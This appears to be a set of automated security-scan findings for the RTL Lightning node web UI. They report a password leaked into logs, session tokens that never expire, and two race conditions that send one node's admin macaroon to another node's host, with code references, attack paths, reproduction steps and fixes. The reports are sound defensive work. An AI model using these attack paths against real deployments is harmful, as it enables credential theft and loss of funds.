**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257272

---

# Eclair API password embedded in WebSocket URL leaks via Invalid URL error log

## Details
server/controllers/eclair/webSocketClient.ts connectWithClient builds the Eclair WebSocket URL by string concatenation with the raw API password: `WS_LINK = UpdatedLNServerURL.slice(0, idx) + ':' + lnApiPassword + '@' + UpdatedLNServerURL.slice(idx) + '/ws'` (line 63) and hands it to `new WebSocket(WS_LINK)`. The password is never percent-encoded, and config.ts (lines 191-226) takes it verbatim from LN_API_PASSWORD, RTL-Config.json or eclair.conf with no character restriction; the REST path authenticates with `Basic base64(':' + password)` (common.ts:280), so a password containing '/', '?', '#' or '\\' is a fully working Eclair deployment except for this WebSocket. Under WHATWG URL parsing the authority of a special-scheme URL ends at the first '/', '?', '#' or '\\' when no '@' has been seen, so `ws://:ab/cd@host:8080/ws` has authority `:ab` with an empty host and `new URL()` fails. ws 8.21.0 (package.json:51) wraps that failure as `throw new SyntaxError('Invalid URL: ' + address)` (dependency assumption, not read in this checkout), so the thrown message carries the full URL including the plaintext password.

connect() (lines 39-57) catches and rethrows `new Error(err)`, whose message is `String(err)` = 'SyntaxError: Invalid URL: ws://:ab/cd@host:8080/ws'. connect() runs synchronously inside the 'CONNECT' listener registered in the constructor (lines 19-21), which RTLWebSocketServer.connectToNodeClient emits (webSocketServer.ts:153) when no clientDetails entry exists for the node; EventEmitter.emit does not catch listener exceptions, so the throw propagates through updateLNWSClientDetails to RTLConf.updateSelectedNode (RTLConf.ts:233), which has no try/catch. Express 5 routes the synchronous throw to the arity-4 error middleware (app.ts:116) -> handleApplicationErrors default branch (app.ts:150-153), which logs `{ level: 'ERROR', msg: 'DEFUALT ERROR', error: err }`. logger.ts's ERROR branch (lines 10-23) has no logLevel gate: it appends `error.message` to stderr via console.error and to the selected node's settings.logFile (default `<rtlConfFilePath>/logs/RTL-Node-N.log`, created with default mode at config.ts:316). The HTTP client receives `400 {}` (JSON.stringify of an Error), so the leak is to the log and console only.

Trigger: GET /rtl/api/conf/updateSelNode/:curr/:prev (isAuthenticated), which the UI issues after fetching config on every app load with a token (rtl.effects.ts:234) and on every node switch (side-navigation:200). Because connect() throws before pushing to webSocketClients and the clientDetails entry is removed whenever the last session's browser WebSocket closes or switches away, the password is written again on each (re)connection of the Eclair node over the life of the process, not only once.

Condition under which the finding holds: the configured Eclair `lnApiPassword` (or `eclair.api.password`) contains '/', '?', '#' or '\\' — common for base64-style random passwords, and nothing in RTL's Eclair_setup.md restricts the character set. The project itself treats this secret as log-sensitive (common.maskPasswords redacts lnApiPassword before the node-config log line, config.ts:305-307) and writes RTL-Config.json 0600 (RTLConf.ts:469); this path defeats both.

## Evidence
1. [server/controllers/eclair/webSocketClient.ts:61–64](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/webSocketClient.ts#L61-L64)
   WS_LINK is built as `ws://` + ':' + lnApiPassword + '@' + host + '/ws' with no percent-encoding and passed to `new WebSocket(WS_LINK)`. A password containing '/', '?', '#' or '\\' terminates the URL authority before '@', leaving an empty host, so `new URL` fails and ws 8.21.0 throws `SyntaxError('Invalid URL: ' + address)` with the password in the message (dependency assumption).
2. [server/controllers/eclair/webSocketClient.ts:39–56](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/webSocketClient.ts#L39-L56)
   connect() wraps connectWithClient in try/catch and rethrows `new Error(err)`, whose message is String(err) — the SyntaxError text including the URL and password. It is invoked synchronously from the 'CONNECT' listener registered at lines 19-21.
3. [server/utils/webSocketServer.ts:133–159](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/webSocketServer.ts#L133-L159)
   connectToNodeClient pushes the clientDetails entry and then emits 'CONNECT' on eventEmitterECL synchronously; EventEmitter.emit does not catch listener exceptions, so the throw propagates to updateLNWSClientDetails and its caller.
4. [server/controllers/shared/RTLConf.ts:227–245](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L227-L245)
   updateSelectedNode (GET /rtl/api/conf/updateSelNode/:curr/:prev, isAuthenticated; called by the UI on app load with a token and on each node switch) calls wsServer.updateLNWSClientDetails with no try/catch after setting common.selectedNode to the Eclair node, so the exception reaches Express's error middleware and the log goes to that node's logFile.
5. [server/utils/app.ts:150–153](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/app.ts#L150-L153)
   handleApplicationErrors default branch logs `{ level: 'ERROR', msg: 'DEFUALT ERROR', error: err }`; err.message carries the URL with the password. The response is `400 JSON.stringify(err)` = `{}`, so the HTTP client does not receive it.
6. [server/utils/app.ts:116–118](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/app.ts#L116-L118)
   The error middleware is registered with arity 4, so Express 5 does invoke handleApplicationErrors for a synchronous throw from a route handler.
7. [server/utils/logger.ts:10–22](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/logger.ts#L10-L22)
   The ERROR branch is unconditional (no logLevel gate): it appends error.message to the console.error line and to settings.logFile of the selected node.
8. [server/utils/config.ts:191–226](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L191-L226)
   lnApiPassword is taken verbatim from LN_API_PASSWORD, RTL-Config.json or eclair.conf (ini/HOCON) with no character validation or encoding, so passwords containing URL-reserved characters reach line 63 unchanged.
9. [server/utils/common.ts:280](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L280)
   The Eclair REST path authenticates with `Basic base64(':' + lnApiPassword)`, which accepts any character set — a deployment with such a password works for every REST call, so the condition is a legitimate, functioning configuration rather than a broken one.
10. [server/controllers/shared/RTLConf.ts:466–470](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L466-L470)
   The project writes RTL-Config.json with mode 0600 so its secrets 'are never world-readable', while the node log file is created with default mode (config.ts:316) and stderr goes to the journal/container log: the log reader is a lower-privileged party than the config reader, which is the boundary this leak crosses.

## Impact
RTL writes the plaintext Eclair API password it is entrusted with into its log file and stderr; confidentiality of that credential is lost to every log reader. RTL's own integrity and availability are unaffected (the request fails with 400 and the process continues). Subsequent-system impact: The Eclair API password is the single HTTP basic-auth credential for Eclair's full REST API: its holder can send payments, send on-chain funds, open/close channels and read all node state.

## Reproduction steps
1. Deployment condition: an Eclair node whose API password contains '/', '?', '#' or '\\' (a working configuration — REST uses Basic auth). The operator's routine authenticated app load or node switch calls updateSelNode; ws 8.21.0 (assumed to throw `SyntaxError('Invalid URL: ' + address)`) makes connect() rethrow with the URL, and handleApplicationErrors logs err.message at ERROR to stderr and the node log file regardless of logLevel. A local user or log consumer who can read the default-mode log file, the journal or container stdout — but not the 0600 RTL-Config.json — recovers the plaintext Eclair API password.

## Recommended fix
1. The Eclair API password is interpolated raw into the WebSocket URL string; any error that stringifies the URL (the ws Invalid URL error) carries the credential, and unencoded reserved characters also make the URL invalid. Fix criteria: Authenticate the Eclair WebSocket with an Authorization header (ws supports `headers` in its options) or at minimum percent-encode the credential (encodeURIComponent) and construct the URL with the URL class so it cannot fail to parse; the password must never appear in any exception message or log line. Verify by configuring a password containing '/' and '#', triggering updateSelNode, and asserting the log contains neither the password nor an 'Invalid URL' line.
2. app.ts handleApplicationErrors logs arbitrary thrown errors' messages at ERROR and the ECL connect path throws out of an HTTP handler instead of being contained. Fix criteria: connectWithClient/connect must catch construction errors and log a fixed message (without the URL) rather than rethrow into the request handler; verify that a WS construction failure yields a 200 updateSelNode response and a log line free of the URL.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sensitive Information in Log File
**CWE:** [CWE-532](https://cwe.mitre.org/data/definitions/532.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257268

---

# Session JWT has no expiry and is not revoked by logout; bare token re-establishes access

## Details
RTL's bearer credential for every protected API route and the WebSocket upgrade is a JWT minted in `authenticateUser` (server/controllers/shared/authenticate.ts:212, also 154/164/235) as `jwt.sign({ user: 'NODE_USER' }, common.secret_key)`. No `expiresIn`, `jti` or audience is set, and `isAuthenticated` (server/utils/authCheck.ts:12-13) and `verifyWSUser` accept any token the HMAC verifies against the boot-time `secret_key` (common.ts:22). Nothing on the server ever invalidates an issued token: `logoutUser` (authenticate.ts:246-255) destroys only the express-session record and clears `connect.sid`; `resetPassword` (authenticate.ts:233-237) mints a new token without rotating the key; the client simply deletes the token from sessionStorage.

The project does intend access to end: the express-session cookie has a one-day `maxAge` (server/utils/app.ts:55), `getOptions` (common.ts:244-253) answers 401 'Session expired after a day's inactivity' when the session has no `selectedNode`, and the frontend logs out after an hour idle (src/app/app.component.ts:136-151). But the session is not what authenticates a request. `GET /rtl/api/conf/updateSelNode/:curr/:prev` (RTLConf.ts:227-245) is guarded only by `isAuthenticated` and repopulates `req.session.selectedNode` on whatever session the request arrives with — a brand-new one, since `saveUninitialized: true`. A token alone therefore re-establishes complete operator access at any time until the process restarts, which for a node UI is typically weeks or months.

Attack path: the attacker holds a token issued to the operator at some earlier point (the precondition — e.g. exfiltrated from the JS-readable sessionStorage by an XSS carried in Lightning-peer data, the threat model's adversary 3; or captured from a request or handshake). After the operator has logged out, changed the password, or simply let the session lapse, the attacker sends `GET /rtl/api/conf/updateSelNode/1/-1` with `Authorization: Bearer <token>` and no cookies; the response sets a new `connect.sid` bound to a session whose `selectedNode` is populated. Every subsequent API call (payments, channel open/close, on-chain sends, config file reads via /conf/config/:nodeType, settings writes) succeeds, and the token also exempts its holder from the TOTP requirement on re-authentication (`hasValidAuthToken`, authenticate.ts:134). CSRF is no barrier to a direct caller: the catch-all route mints a `_csrf`/`XSRF-TOKEN` pair for any client that fetches `/rtl/`. There is no operator-visible way to invalidate outstanding tokens short of restarting RTL.

Root cause: insufficient session expiration (CWE-613) — the authentication credential carries no lifetime and the server keeps no state that lets logout, inactivity or a credential change end it, while the only server-side expiry control gates on session state that a bare token can rebuild.

## Evidence
1. [server/controllers/shared/authenticate.ts:212–214](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L212-L214)
   The operator credential is minted as `jwt.sign({ user: 'NODE_USER' }, common.secret_key)` with no `expiresIn`, `jti` or other lifetime claim (same pattern at lines 154, 164 and 235). With jsonwebtoken 9.0.3 (package.json) a token without an `exp` claim verifies for as long as `common.secret_key` (random per boot, common.ts:22) is unchanged, i.e. until RTL restarts. This is the primary fix location.
2. [server/utils/authCheck.ts:10–19](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/authCheck.ts#L10-L19)
   isAuthenticated, the only guard on every protected route, calls `jwt.verify(token, common.secret_key)` and nothing else: no session lookup, revocation list or issue-time check. verifyWSUser (lines 22-31) does the same for the WebSocket upgrade. Logout and the session's one-day maxAge therefore have no bearing on whether a token is accepted.
3. [server/controllers/shared/RTLConf.ts:227–244](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L227-L244)
   GET /rtl/api/conf/updateSelNode/:currNodeIndex/:prevNodeIndex (routes/shared/RTLConf.ts:12) is guarded only by isAuthenticated and sets `req.session.selectedNode = common.findNode(+currNodeIndex)` on whatever session the request carries. Because express-session runs with saveUninitialized:true (app.ts:55), a request with a Bearer token and no cookie at all gets a brand-new session that this handler fully populates; loadDatabase (database.ts:69-82) swallows any error. The destroyed-session state that logout and inactivity rely on is rebuilt from the bare token.
4. [server/controllers/shared/authenticate.ts:246–254](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L246-L254)
   logoutUser destroys only the express-session record and clears connect.sid. The JWT the client held is neither recorded nor invalidated; the frontend merely deletes it from sessionStorage (src/app/store/rtl.effects.ts:602).
5. [server/utils/common.ts:244–253](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L244-L253)
   getOptions is the shipped control the project relies on to end node access: when `req.session.selectedNode` is absent (session destroyed by logout or expired after the one-day maxAge) it answers 401 'Session expired after a day's inactivity'. The control gates only on the express-session, which updateSelectedNode rebuilds from the token, so it is bypassed.
6. [server/controllers/shared/authenticate.ts:233–237](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L233-L237)
   resetPassword mints a fresh token but does not rotate `secret_key` or revoke earlier tokens, so changing the RTL password does not cut off a holder of a previously issued token either. Enabling 2FA afterwards does not help: hasValidAuthToken (line 134) exempts any valid token holder from TOTP on re-authentication.
7. [src/app/app.component.ts:136–151](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/app.component.ts#L136-L151)
   The frontend logs the operator out after an hour of inactivity (angular-user-idle, app.module.ts:57) with the message 'Time limit exceeded for session inactivity', and stores the token in sessionStorage (rtl.effects.ts:599), which is readable by any script running in the page. Together with the server-side one-day maxAge this shows the project intends the token to be a short-lived session credential, not an indefinite one.

## Impact
The incremental gain over what the project concedes to a token holder is persistence: access the operator believes ended at logout, at password reset, or after the one-day/one-hour inactivity windows continues for the process lifetime and bypasses the server's only session-expiry control. Within that window the holder reads all node and RTL configuration data (including config file contents via /conf/config) and performs every operator action (payments, channel open/close, on-chain sends, settings and config writes). Availability impact is limited to what the operator role can disrupt; RTL itself cannot be shut down via the API.

## Reproduction steps
1. Network attacker who has previously obtained the operator's session JWT through a separate exposure (XSS from node-supplied data reading sessionStorage, a captured request or WebSocket handshake, a shared or unattended machine). Attack requirements PRESENT because the token must already have leaked, a condition outside the attacker's control; privileges HIGH because the leaked material is itself the operator-level credential. Given the token, a single GET to updateSelNode with the Bearer header and no cookies rebuilds a session and full API access, indefinitely after the operator's logout or password change and until a process restart. No further defence to defeat (CSRF tokens are self-served to any direct client), no user interaction.

## Recommended fix
1. Tokens are issued without a lifetime, so they remain valid until the signing key changes at restart. Fix criteria: Issued tokens must carry a bounded lifetime consistent with the intended session length (e.g. the one-day session maxAge) and isAuthenticated/verifyWSUser must reject expired tokens. Verify: a token older than the configured lifetime is refused with 401 on every guarded route and on the WebSocket upgrade.
2. Logout does not revoke the bearer token; only the express-session record is destroyed, and updateSelNode lets a bare token rebuild a session. Fix criteria: After logout the token presented at login time must no longer authenticate (server-side revocation keyed by jti/issue time, or binding the token to the session it was issued for so a destroyed session invalidates it). Verify: after GET /authenticate/logout, the same Bearer token gets 401 on updateSelNode and all other guarded routes.
3. Credential changes (password reset, enabling 2FA) do not invalidate outstanding tokens, so an operator who suspects exposure has no remedy short of restarting RTL. Fix criteria: A password reset must invalidate every previously issued token (rotate the signing key or bump a server-side token generation checked by isAuthenticated). Verify: after POST /authenticate/reset, a token issued before the reset is refused with 401 while the token returned by the reset is accepted.

---
**Severity:** HIGH
**Status:** Open
**Category:** Insufficient session expiration
**CWE:** [CWE-613](https://cwe.mitre.org/data/definitions/613.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257265

---

# getQueryRoutes alias lookups use stale module-level options, forwarding another node's macaroon

## Details
server/controllers/lnd/graph.ts shares one module-level `options` object across all its handlers. getQueryRoutes assigns `options = common.getOptions(req)` — the session's node options object, whose `Grpc-Metadata-macaroon` header is that node's admin.macaroon hex (common.ts updateSelectedNodeOptions) — issues `GET <lnServerUrl>/v1/graph/routes/<dest>/<amt>` (a pathfinding call that can take seconds) and then, in the `.then` callback, re-reads the module-level `options` (line 99) to build the per-hop alias lookups `GET <lnServerUrl>/v1/graph/node/<pubkey>` via getAliasFromPubkey. If, during the await, another graph.ts handler (getGraphInfo on dashboard load, getGraphNode / getAliasesForPubkeys alias lookups, getGraphEdge channel lookups, another queryroutes) ran for a different node in a multi-node RTL — a second browser session, or the operator switching nodes while the query is in flight — `options` now points at that node's session options. getAliasFromPubkey overwrites only `url` with node A's lnServerUrl (selNode is captured from req.session at line 98), so the alias requests are sent to node A's REST host carrying node B's admin macaroon.

Consequences: (1) node B's admin macaroon — full control of node B — is disclosed to whatever serves node A's REST endpoint and to any party on that path (request.ts dials with `rejectUnauthorized:false`). (2) The alias lookups fail LND's macaroon check, so the route hops display truncated pubkeys instead of aliases (cosmetic).

This is the same stale-module-state class the maintainers fixed in 0.15.10 (#1651: 'each handler captures a per-request copy before building the task thunks'), in 0.15.11 (#1668, peers.ts, with regression tests in test/backend/lnd-peers.test.mjs that assert node B's macaroon never reaches node A) and in 0.15.13 for Loop (#1715). getQueryRoutes received the per-request copy, but takes it inside the `.then`, after the asynchronous boundary, so the copy is already stale; getAliasesForPubkeys (line 163) takes it synchronously and is not affected. The compiled backend/controllers/lnd/graph.js:111 is identical. Precondition: multi-node configuration (a supported deployment) and a concurrent graph.ts request for another node during the pathfinding window.

## Evidence
1. [server/controllers/lnd/graph.ts:95–100](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/graph.ts#L95-L100)
   Inside the .then that runs after the /v1/graph/routes round trip, line 99 destructures the module-level `options` (`const { qs: _qs, ...requestOptions } = options;`) and line 100 hands copies of it to getAliasFromPubkey for every hop. Any other graph.ts handler that ran during the await has reassigned `options` to its own session's node options, headers (macaroon) included. The fix must move this capture before the request at line 95.
2. [server/controllers/lnd/graph.ts:5](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/graph.ts#L5)
   `let options = null;` is module-wide state shared by all seven handlers in this file (getDescribeGraph, getGraphInfo, getGraphNode, getGraphEdge, getQueryRoutes, getRemoteFeePolicy, getAliasesForPubkeys), each of which assigns it at request start.
3. [server/controllers/lnd/graph.ts:13–22](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/graph.ts#L13-L22)
   getAliasFromPubkey sets only `url` (from selNode.settings.lnServerUrl, i.e. the route-querying node A captured from req.session at line 98) on the options it is given and sends the request, so the stale headers (node B's macaroon) travel to node A's host unchanged.
4. [server/utils/common.ts:244–250](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L244-L250)
   getOptions returns `req.session.selectedNode.authentication.options` itself: the per-session object whose `Grpc-Metadata-macaroon` header updateSelectedNodeOptions (line 284) fills with that node's admin.macaroon hex. The module-level `options` therefore points at whichever session's credentialed object the most recent graph.ts handler assigned.
5. [server/controllers/lnd/graph.ts:156–164](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/graph.ts#L156-L164)
   Contrast: getAliasesForPubkeys performs the identical destructure synchronously, before any await, which is the pattern the 0.15.10 (#1651) fix introduced for the alias fan-outs; getQueryRoutes does it after the await, so its snapshot is already stale.
6. [backend/controllers/lnd/graph.js:111](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/backend/controllers/lnd/graph.js#L111)
   The committed, shipped transpilation (release tar and Docker image run backend/) contains the same post-await read of the module-level `options`.
7. [src/app/shared/services/data.service.ts:118–122](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/shared/services/data.service.ts#L118-L122)
   The frontend calls /network/nodes and /network/node/<pubkey> as routine background alias lookups (and /network/info on dashboard load, lnd.effects.ts:490), so another session's graph.ts request during a multi-second queryroutes pathfinding call is a normal occurrence, not a contrived one.

## Impact
RTL's own held credential — the admin.macaroon it reads from macaroonPath and keeps in the session options, listed by the threat model as an RTL asset whose exposure is full control of funds — is sent to a host it was never meant for: restricted information whose disclosure has a direct, serious impact (CVSS 4.0 VC:H). The only integrity effect is cosmetic (hop aliases fall back to truncated pubkeys), not a security-relevant modification of RTL state; no availability effect. Subsequent-system impact: The host serving node A's REST API (or an on-path party on that unverified-TLS link) obtains node B's admin.macaroon, which authorises every LND RPC on node B — reading all data, paying invoices, closing channels, on-chain sends — until rotated.

## Reproduction steps
1. The recipient needs only to operate (or observe traffic to) node A's REST endpoint. When the operator runs Query Routes on node A while any dashboard/alias/channel-lookup request for node B is handled in another session, RTL itself delivers node B's admin macaroon to node A's host in the alias lookups. Requires multi-node deployment and overlap with the queryroutes latency window, which pathfinding makes seconds long and which routine UI graph calls fill. Operator action is routine use.

## Recommended fix
1. getQueryRoutes captures the credentialed options for its follow-up alias requests from module-level state after the asynchronous routes call instead of from a request-scoped copy taken before it. Fix criteria: The /v1/graph/node alias lookups issued after a queryroutes response always carry the macaroon of the node the route was queried on, regardless of concurrent graph requests for other nodes. Verify with two fake LND servers: start getQueryRoutes against A (slow routes reply), run getGraphInfo against B during the wait, and assert A's /v1/graph/node requests carry A's macaroon and B's macaroon never reaches A.
2. Credentialed options live in a mutable module-level variable shared across requests throughout server/controllers/lnd, so every post-await reference is a latent cross-node credential confusion. Fix criteria: No LND controller references the module-level `options` after an await; follow-up requests reuse a copy captured synchronously at request start or re-derive from req.session. Verify by auditing every .then/.catch in server/controllers/lnd for reads of the module-level `options`.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race Condition
**CWE:** [CWE-362](https://cwe.mitre.org/data/definitions/362.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257259

---

# addInvoice subscribes with stale module-level options, sending another node's admin macaroon

## Details
server/controllers/lnd/invoices.ts keeps one module-level `options` object. addInvoice sets `options = common.getOptions(req)` (the session's node options, whose `Grpc-Metadata-macaroon` header is that node's admin.macaroon in hex), POSTs the invoice to LND and, in the `.then` that runs after the network round trip, calls `lndWsClient.subscribeToInvoice(options, req.session.selectedNode, body.r_hash)` using the module-level variable again instead of a request-scoped copy. Every other handler in the module (invoiceLookup, listInvoices, addInvoice) reassigns that same variable at the start of its own request. In a multi-node RTL (several nodes in one RTL-Config.json, each with its own lnServerUrl and macaroonPath), a request for node B that arrives during node A's addInvoice round trip replaces `options` with node B's session options. subscribeToInvoice then spreads those options and overrides only `url` with node A's lnServerUrl, so RTL sends `GET <nodeA.lnServerUrl>/v2/invoices/subscribe/<hash>` carrying node B's admin macaroon (and node B's leftover `form`, if any).

Consequences: (1) node B's admin macaroon — full spend/control authority over node B — is disclosed to whatever host serves node A's REST endpoint (and to any on-path party, since request.ts dials with `rejectUnauthorized:false`); in deployments where the nodes live on different hosts or are operated by different providers this crosses a trust boundary the config intends to keep separate (the settings pinning in addSecureData exists precisely so credentialed requests cannot be re-pointed). (2) The subscription for node A's new invoice fails with an LND auth error, so the operator silently loses the WebSocket settle notification the UI relies on (lnd.effects.ts dispatches updateInvoice from this stream).

The same shape was fixed for Loop (#1714) and for decodePayments/getAliasesForPubkeys (per-task option copies), and is tested there; addInvoice was not covered. The compiled backend/controllers/lnd/invoices.js:117-129 is identical. Precondition: multi-node configuration and concurrent invoice-module requests across nodes (a second tab or device on another node, or the UI's periodic invoice list refresh) within the LND addInvoice latency window.

## Evidence
1. [server/controllers/lnd/invoices.ts:115–123](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/invoices.ts#L115-L123)
   addInvoice assigns the module-level `options` at line 115 to this session's node options (node A: its lnServerUrl and admin.macaroon header), POSTs to LND, and in the `.then` after the network round trip (line 123) passes the *module-level* `options` to lndWsClient.subscribeToInvoice instead of a request-scoped copy. Any invoiceLookup/listInvoices/addInvoice call served in the meantime for a session on another node has reassigned `options` to that node's session options, including its `Grpc-Metadata-macaroon` header.
2. [server/controllers/lnd/invoices.ts:6](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/invoices.ts#L6)
   `let options = null;` is shared by every request handled by this module; it is not request-scoped.
3. [server/controllers/lnd/invoices.ts:30](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/invoices.ts#L30)
   invoiceLookup (and listInvoices at line 54) reassign the same module-level `options` from their own session; the frontend issues these list/lookup calls routinely, so the window between addInvoice's POST and its .then is realistically filled by another session's request.
4. [server/controllers/lnd/webSocketClient.ts:58–63](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/webSocketClient.ts#L58-L63)
   subscribeToInvoice spreads the options it is given (headers included) and only overrides `url` with selectedNode.settings.lnServerUrl. So the request is sent to the invoice-creating node's host carrying whatever macaroon header the stale options hold.
5. [server/utils/common.ts:244–252](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L244-L252)
   getOptions returns req.session.selectedNode.authentication.options — the per-session copy whose headers carry that node's admin.macaroon hex (set at common.ts:284/344). This is the object the module-level `options` points at.
6. [test/backend/lnd-path-params.test.mjs:214–225](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/test/backend/lnd-path-params.test.mjs#L214-L225)
   Maintainers already guard this exact class for decodePayments ('a list still being decoded keeps its own credentials when another session makes a request') and fixed it for Loop (#1714); addInvoice was left with the same pattern.

## Impact
RTL discloses a credential it holds — node B's admin.macaroon hex, the asset SECURITY.md and addSecureData/removeSecureData treat as most sensitive — to a host it is only meant to send node A's credentials to; that is a full-confidentiality loss of RTL's own secret material. Node A's invoice subscription is sent with the wrong macaroon and fails, so the operator silently loses the WebSocket settle notification for that invoice (minor integrity of UI state). No availability impact on RTL. Subsequent-system impact: Node B's LND admin macaroon grants every RPC on node B — read all data, send payments, close channels, on-chain sends — to whoever controls node A's REST host or the unverified-TLS path to it, until the operator bakes a new macaroon.

## Reproduction steps
1. Trigger: the operator creates an invoice on node A (routine use) while any invoice-module request (invoiceLookup/listInvoices/addInvoice, which the UI issues on page load, after WS invoice events and on pagination — lnd.effects.ts) is served for a session selected on node B. Node B's options are then what addInvoice's .then hands to subscribeToInvoice, which spreads them and overrides only url with node A's lnServerUrl. The recipient — whoever serves node A's REST endpoint, or an on-path party since request.ts dials with rejectUnauthorized:false — needs no RTL privileges and no action beyond answering; as the server for the POST /v1/invoices it can also delay its response (up to request.ts's 600 s bound) to stretch the race window until a node-B request arrives. Requires a multi-node RTL config (docs/Multi_node_setup.md) with a second session on another node; sessions are per browser/device, so a second device, browser or an operator switching nodes via /updateSelNode and reloading invoices suffices.

## Recommended fix
1. addInvoice reads the module-level `options` after an asynchronous boundary, so the credentials it forwards to subscribeToInvoice may belong to a different request/node than the one whose invoice was just created. Fix criteria: The subscription request for a newly added invoice always carries the macaroon of the node the invoice was created on, regardless of what other invoice-module requests ran concurrently. Verify with two fake LND servers A and B: start addInvoice against A (slow response), issue listInvoices against B during the wait, and assert A's /v2/invoices/subscribe request arrives with A's macaroon and B's macaroon is never seen by A.
2. Credentialed request options are held in mutable module-level state shared across all requests in the LND controllers, so any handler that touches them after an await is exposed to the same confusion. Fix criteria: No handler in server/controllers/lnd forwards credentials read from module-level state after an asynchronous step; options used post-await are request-scoped copies (or re-derived from the request's own session). Verify by auditing each `.then` in the LND controllers for references to the module-level `options`.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race Condition
**CWE:** [CWE-362](https://cwe.mitre.org/data/definitions/362.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
